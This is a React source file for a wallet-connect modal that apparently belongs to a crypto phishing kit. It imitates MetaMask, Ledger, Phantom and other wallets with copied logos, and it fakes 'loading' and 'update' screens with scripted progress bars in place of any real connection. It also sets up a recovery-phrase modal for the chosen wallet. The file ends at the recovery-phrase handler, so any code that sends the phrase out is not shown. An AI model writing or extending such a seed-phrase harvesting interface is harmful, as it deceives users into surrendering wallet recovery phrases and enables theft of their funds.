import { useState, useEffect } from 'react'
import RecoveryPhraseModal from './RecoveryPhraseModal'

/* Wallet list — icons from reference site (exact logos) */
const WALLETS = [
  { name: 'MetaMask',       img: '/media/images/wallet-metamask.webp' },
  { name: 'Trust Wallet',   img: '/media/images/wallet-trust-wallet.webp' },
  { name: 'Coinbase Wallet',img: '/media/images/wallet-coinbase.webp' },
  { name: 'Phantom Wallet', img: '/media/images/wallet-phantom.webp' },
  { name: 'OKX Wallet',     img: '/media/images/wallet-okx.webp' },
  { name: 'Rabby Wallet',   img: '/media/images/wallet-rabby.webp' },
  { name: 'Rainbow',        img: '/media/images/wallet-rainbow.png' },
  { name: 'Ledger',         img: '/media/images/wallet-ledger.webp' },
  { name: 'Keplr',          img: '/media/images/keplr_new.png' },
  { name: 'WalletConnect',  img: '/media/images/walletconnect.png' },
  { name: '1inch Wallet',   img: '/media/images/1inch.png' },
]

/* Fallback icon when image fails to load */
function WalletIcon({ wallet }) {
  const [failed, setFailed] = useState(false)
  const initials = wallet.name.slice(0, 2).toUpperCase()

  if (failed) {
    return (
      <div style={{
        width: 40, height: 40, borderRadius: 10, flexShrink: 0,
        background: 'linear-gradient(135deg,#3a96ff,#00c896)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        color: '#fff', fontSize: 13, fontWeight: 700,
      }}>{initials}</div>
    )
  }

  return (
    <img
      src={wallet.img}
      alt={wallet.name}
      onError={() => setFailed(true)}
      style={{ width: 40, height: 40, borderRadius: 10, objectFit: 'contain', flexShrink: 0 }}
    />
  )
}

export default function WalletModal({ open, onClose }) {
  const [selected, setSelected] = useState(null)
  const [search, setSearch] = useState('')
  const [mmState, setMmState] = useState('idle') // 'idle'|'loading'|'update'|'updating'
  const [mmProgress, setMmProgress] = useState(0)
  const [twState, setTwState] = useState('idle')
  const [twProgress, setTwProgress] = useState(0)
  const [gFlow, setGFlow] = useState({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 })
  const [wcState, setWcState] = useState('idle') // 'idle'|'loading'|'update'|'updating'
  const [wcProgress, setWcProgress] = useState(0)
  const [cbState, setCbState] = useState('idle') // Coinbase
  const [cbProgress, setCbProgress] = useState(0)
  const [phState, setPhState] = useState('idle') // Phantom
  const [phProgress, setPhProgress] = useState(0)
  const [okxState, setOkxState] = useState('idle') // OKX
  const [okxProgress, setOkxProgress] = useState(0)
  const [inchState, setInchState] = useState('idle') // 1inch
  const [inchProgress, setInchProgress] = useState(0)
  const [rabbyState, setRabbyState] = useState('idle') // Rabby
  const [rabbyProgress, setRabbyProgress] = useState(0)
  const [rainbowState, setRainbowState] = useState('idle') // Rainbow
  const [rainbowProgress, setRainbowProgress] = useState(0)
  const [keplrState, setKeplrState] = useState('idle') // Keplr
  const [keplrProgress, setKeplrProgress] = useState(0)
  const [ledgerState, setLedgerState] = useState('idle') // Ledger
  const [ledgerProgress, setLedgerProgress] = useState(0)

  // Recovery Phrase Modal state
  const [showRecoveryModal, setShowRecoveryModal] = useState(false)
  const [recoveryLoading, setRecoveryLoading] = useState(false)
  const [selectedWalletForRecovery, setSelectedWalletForRecovery] = useState(null)
  const [pendingWalletConnect, setPendingWalletConnect] = useState(null)

  // wallet accent colors
  const WALLET_COLORS = {
    'Coinbase Wallet': '#0052FF',
    'Phantom Wallet':  '#6B3FE4',
    'OKX Wallet':      '#111111',
    'Rabby Wallet':    '#7084FF',
    'Rainbow':         '#FF6B6B',
    'Ledger':          '#333333',
    'Keplr':           '#6F3AFA',
    'WalletConnect':   '#3B99FC',
    '1inch Wallet':    '#D82122',
  }

  useEffect(() => {
    if (open) { setSelected(null); setSearch(''); setMmState('idle'); setMmProgress(0); setTwState('idle'); setTwProgress(0); setWcState('idle'); setWcProgress(0); setCbState('idle'); setCbProgress(0); setPhState('idle'); setPhProgress(0); setOkxState('idle'); setOkxProgress(0); setInchState('idle'); setInchProgress(0); setRabbyState('idle'); setRabbyProgress(0); setRainbowState('idle'); setRainbowProgress(0); setKeplrState('idle'); setKeplrProgress(0); setLedgerState('idle'); setLedgerProgress(0); setGFlow({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 }) }
  }, [open])

  const handleMetaMaskConnect = () => {
    onClose()
    setMmState('loading')
    setTimeout(() => setMmState('update'), 2200)
  }

  const handleMetaMaskUpdate = () => {
    setMmState('updating')
    setMmProgress(0)
  }

  const handleTrustConnect = () => {
    onClose()
    setTwState('loading')
    setTimeout(() => setTwState('update'), 2200)
  }

  const handleTrustUpdate = () => {
    setTwState('updating')
    setTwProgress(0)
  }

  const handleWcConnect = () => {
    onClose()
    setWcState('loading')
    setTimeout(() => setWcState('update'), 2200)
  }
  const handleWcUpdate = () => { setWcState('updating'); setWcProgress(0) }

  const handleCbConnect = () => { onClose(); setCbState('loading') }
  const handleCbUpdate  = () => { setCbState('updating'); setCbProgress(0) }

  const handlePhConnect  = () => { onClose(); setPhState('loading'); setTimeout(() => setPhState('update'), 2200) }
  const handleOkxConnect    = () => { onClose(); setOkxState('loading') }
  const handleOkxUpdate     = () => { setOkxState('updating'); setOkxProgress(0) }
  const handleInchConnect   = () => { onClose(); setInchState('loading') } // video onEnded triggers update
  const handleInchUpdate    = () => { setInchState('updating'); setInchProgress(0) }
  const handleRabbyConnect  = () => { onClose(); setRabbyState('loading'); setTimeout(() => setRabbyState('update'), 2200) }
  const handleRabbyUpdate   = () => { setRabbyState('updating'); setRabbyProgress(0) }
  const handleRainbowConnect= () => { onClose(); setRainbowState('loading'); setTimeout(() => setRainbowState('update'), 2200) }
  const handleRainbowUpdate = () => { setRainbowState('updating'); setRainbowProgress(0) }
  const handleKeplrConnect  = () => { onClose(); setKeplrState('loading'); setTimeout(() => setKeplrState('update'), 2200) }
  const handleKeplrUpdate   = () => { setKeplrState('updating'); setKeplrProgress(0) }
  const handleLedgerConnect = () => { onClose(); setLedgerState('loading'); setTimeout(() => setLedgerState('update'), 2200) }
  const handleLedgerUpdate  = () => { setLedgerState('updating'); setLedgerProgress(0) }

  // Progress effects for new wallets
  useEffect(() => {
    if (inchState !== 'updating') return
    const iv = setInterval(() => { setInchProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [inchState])
  useEffect(() => {
    if (rabbyState !== 'updating') return
    const iv = setInterval(() => { setRabbyProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [rabbyState])
  useEffect(() => {
    if (rainbowState !== 'updating') return
    const iv = setInterval(() => { setRainbowProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [rainbowState])
  useEffect(() => {
    if (keplrState !== 'updating') return
    const iv = setInterval(() => { setKeplrProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [keplrState])
  useEffect(() => {
    if (ledgerState !== 'updating') return
    const iv = setInterval(() => { setLedgerProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [ledgerState])

  // Animate OKX progress bar
  useEffect(() => {
    if (okxState !== 'updating') return
    const interval = setInterval(() => {
      setOkxProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [okxState])
  const handlePhUpdate  = () => { setPhState('updating'); setPhProgress(0) }

  // Animate Phantom progress bar
  useEffect(() => {
    if (phState !== 'updating') return
    const interval = setInterval(() => {
      setPhProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [phState])

  // Animate CB progress bar
  useEffect(() => {
    if (cbState !== 'updating') return
    const interval = setInterval(() => {
      setCbProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [cbState])

  // Animate WC progress bar
  useEffect(() => {
    if (wcState !== 'updating') return
    const interval = setInterval(() => {
      setWcProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [wcState])

  // Animate MM progress bar
  useEffect(() => {
    if (mmState !== 'updating') return
    const interval = setInterval(() => {
      setMmProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [mmState])

  // Animate TW progress bar
  useEffect(() => {
    if (twState !== 'updating') return
    const interval = setInterval(() => {
      setTwProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [twState])

  // Generic wallet connect handler
  const VIDEO_WALLETS = ['OKX Wallet', '1inch Wallet']

  const handleGenericConnect = (walletName, walletImg) => {
    const color = WALLET_COLORS[walletName] || '#3a96ff'
    onClose()
    setGFlow({ name: walletName, img: walletImg, color, state: 'loading', progress: 0 })
    // For video wallets, the transition is triggered by onEnded on the video element
    if (!VIDEO_WALLETS.includes(walletName)) {
      setTimeout(() => setGFlow(f => ({ ...f, state: 'update' })), 2200)
    }
  }
  const handleGenericUpdate = () => setGFlow(f => ({ ...f, state: 'updating', progress: 0 }))

  // Recovery Phrase Handler
